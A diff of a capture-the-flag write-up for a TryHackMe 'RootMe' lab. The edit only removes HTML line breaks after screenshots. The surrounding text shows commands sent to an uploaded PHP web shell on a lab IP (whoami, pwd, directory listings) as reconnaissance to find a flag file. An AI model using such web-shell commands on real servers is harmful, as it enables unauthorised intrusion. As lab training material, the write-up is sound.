@@ -144,8 +144,8 @@ http://10.201.124.246/uploads/bad2.phtml?command=whoami
 http://10.201.124.246/uploads/bad2.phtml?command=pwd
 ```
 
-![command now works](/images/THM%3A%20RootMe/idcmd.png) <br>
-![command now works](/images/THM%3A%20RootMe/whoamicmd.png) <br>
+![command now works](/images/THM%3A%20RootMe/idcmd.png)
+![command now works](/images/THM%3A%20RootMe/whoamicmd.png)
 ![command now works](/images/THM%3A%20RootMe/pwdcmd.png)
 
 From these commands, we essentially did some reconnaissance, especially from the last one, we see multiple directories that we can access or go back to.
@@ -157,7 +157,7 @@ http://10.201.124.246/uploads/bad2.phtml?command=ls /var/www/html
 http://10.201.124.246/uploads/bad2.phtml?command=ls /var/www
 ```
 
-![ls on /var/www/html](/images/THM%3A%20RootMe/html.png) <br>
+![ls on /var/www/html](/images/THM%3A%20RootMe/html.png)
 ![ls on /var/www](/images/THM%3A%20RootMe/www.png)
 
 As you can see, the `user.txt` file is located in the `/var/www` directory. Another way to do this is to use the `find` command on Linux. Given that we had the necessary scope of directories from the `pwd` command, we can just run `find /var -name "user.txt`.
